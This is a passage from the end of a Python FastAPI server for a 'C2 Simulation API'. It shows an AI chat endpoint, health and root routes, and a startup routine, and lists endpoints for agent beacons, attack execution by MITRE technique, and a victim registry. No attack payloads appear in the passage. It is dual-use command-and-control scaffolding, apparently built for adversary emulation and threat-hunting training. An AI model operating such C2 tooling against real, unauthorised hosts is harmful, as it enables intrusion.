    prompt = PROMPT_TEMPLATES["threat_hunt"].format(
        techniques_list = "\n".join(enriched),
        timeframe       = timeframe,
    )

    hypothesis = await ai.generate(prompt, temperature=0.5, max_tokens=400)
    return {"techniques": techniques, "timeframe": timeframe, "model": ai.model, "hypothesis": hypothesis}


@app.post("/api/ai/chat", tags=["ai"])
async def ai_chat(data: dict):
    messages = data.get("messages", [])
    if not messages:
        raise HTTPException(status_code=400, detail="'messages' list required")

    system_msgs = [m for m in messages if m.get("role") == "system"]
    conv_msgs   = [m for m in messages if m.get("role") != "system"][-4:]

    if not system_msgs:
        system_msgs = [{
            "role":    "system",
            "content": (
                "You are an expert cybersecurity analyst specialising in threat intelligence, "
                "MITRE ATT&CK, red teaming, and incident response. Be concise — 3-6 sentences max."
            ),
        }]

    response = await ai.chat(system_msgs + conv_msgs, temperature=0.6, max_tokens=300)
    return {"model": ai.model, "response": response}

# =============================================================================
#  ROUTES — HEALTH & ROOT
# =============================================================================
@app.get("/health", tags=["system"])
async def health_check():
    if mitre.techniques is None:
        mitre.load_data()

    with EXECUTED_LOCK:
        exec_count = len(EXECUTED_TECHNIQUES)

    with VICTIM_LOCK:
        victim_count  = len(VICTIM_REGISTRY)
        active_victims = sum(1 for v in VICTIM_REGISTRY.values() if v.get("active"))

    return {
        "status":                "healthy",
        "timestamp":             datetime.utcnow().isoformat(),
        "mitre_loaded":          mitre.techniques is not None,
        "mitre_source":          "github" if not mitre.using_local_cache else "local_cache",
        "technique_count":       len(mitre.techniques_dict) if not mitre.using_local_cache else len(MITRE_LOCAL_CACHE),
        "agents_connected":      len(AGENTS),
        "tasks_pending":         sum(len(t) for t in TASK_QUEUE.values()),
        "ai_configured":         ai.is_available(),
        "ai_model":              ai.model,
        "ai_backend":            "groq",
        "apt_correlator_loaded": apt_correlator.loaded,
        "apt_groups_loaded":     len(apt_correlator.groups) if apt_correlator.loaded else 0,
        "executed_techniques":   exec_count,
        "navigator_layer_ready": exec_count > 0,
        # ── new victim fields ────────────────────────────────────────────────
        "victim_count":          victim_count,
        "active_victims":        active_victims,
    }


@app.get("/", tags=["system"])
async def root():
    return {
        "name":    "C2 Simulation API",
        "version": "3.1.0",
        "status":  "operational",
        "ai":      f"Groq / {ai.model}",
        "docs":    "/docs",
        "endpoints": {
            "auth":      ["POST /token"],
            "system":    ["POST /api/system/start", "POST /api/system/reset", "GET /health"],
            "c2":        ["POST /c2/beacon", "POST /c2/output", "POST /c2/custom"],
            "agents":    ["GET /api/agents", "GET /api/output/{host}"],
            "logs":      ["GET /api/logs", "GET /api/logs/stats"],
            "mitre":     ["GET /api/mitre/{t_code}", "GET /api/mitre/search/{term}", "GET /api/mitre/stats"],
            "attack":    ["GET /api/attack/supported", "POST /api/attack/custom", "POST /api/attack/{t_code}"],
            "apt":       ["GET /api/apt/correlate", "GET /api/apt/groups", "GET /api/apt/{group_id}/techniques"],
            "navigator": ["GET /api/navigator/layer", "POST /api/navigator/layer/save", "GET /api/navigator/status"],
            "ai":        [
                "GET /api/ai/status", "POST /api/ai/explain", "POST /api/ai/explain/stream",
                "POST /api/ai/analyze-output", "POST /api/ai/threat-hunt", "POST /api/ai/chat",
            ],
            # ── new victim endpoints ─────────────────────────────────────────
            "victims": [
                "GET  /api/victims",
                "POST /api/victims/add",
                "PATCH /api/victims/{victim_id}",
                "DELETE /api/victims/{victim_id}",
                "GET  /api/victims/{victim_id}/status",
                "GET  /api/victims/{victim_id}/outputs",
                "POST /api/victims/{victim_id}/clear-tasks",
            ],
        },
    }

# =============================================================================
#  STARTUP
# =============================================================================
@app.on_event("startup")
async def startup_event():
    logger.info("=" * 60)
    logger.info(" C2 Simulation API v3.1  —  Groq + APT Correlation + Dynamic Victims")
    logger.info("=" * 60)

    mitre.load_data()
    if not mitre.using_local_cache:
        logger.info(f"MITRE: GitHub STIX — {len(mitre.techniques_dict)} techniques")
    else:
        logger.info(f"MITRE: local cache — {len(MITRE_LOCAL_CACHE)} techniques")

    if mitre.techniques:
        n = apt_correlator.load_from_stix(mitre.techniques)
        logger.info(f"APT correlator: {n} groups loaded")
    else:
        logger.warning("APT correlator: no STIX data available")

    healthy = await ai.health_check()
    if healthy:
        logger.info(f"AI: Groq API connected — model '{ai.model}' ready")
    else:
        logger.warning("AI: Groq API key not configured — set GROQ_API_KEY")

    logger.info(f"{len(ATTACK_COMMANDS)} attack techniques registered")

    # Ensure queues exist for the default victim
    _ensure_victim_queues(DEFAULT_VICTIM)
    logger.info(f"Victim registry initialised — default victim: '{DEFAULT_VICTIM}'")

    asyncio.create_task(_log_system_metrics())
    asyncio.create_task(_log_security_events())
    asyncio.create_task(_log_network_events())
    asyncio.create_task(_log_filesystem_events())
    logger.info("Live log generators started")

    asyncio.create_task(_auto_save_navigator_layer(interval_seconds=30))
    logger.info(f"Navigator auto-save started -> {NAVIGATOR_LAYER_PATH}")
